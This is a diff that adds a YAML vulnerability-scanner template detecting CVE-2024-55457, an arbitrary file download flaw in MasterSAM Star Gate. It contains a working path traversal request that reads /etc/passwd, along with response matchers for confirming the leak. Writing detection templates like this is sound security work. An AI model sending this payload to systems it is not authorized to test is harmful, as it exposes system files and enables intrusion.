@@ -1,0 +1,33 @@
+id: cve-2024-55457-anyfile-download
+info:
+  name: MasterSAM Star Gate Arbitrary File Download Vulnerability (CVE-2024-55457)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,cve,cve-2024-55457
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/adama/adama/downloadService?type=1&file=../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: header
+        words:
+          - "filename=\"passwd\""
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
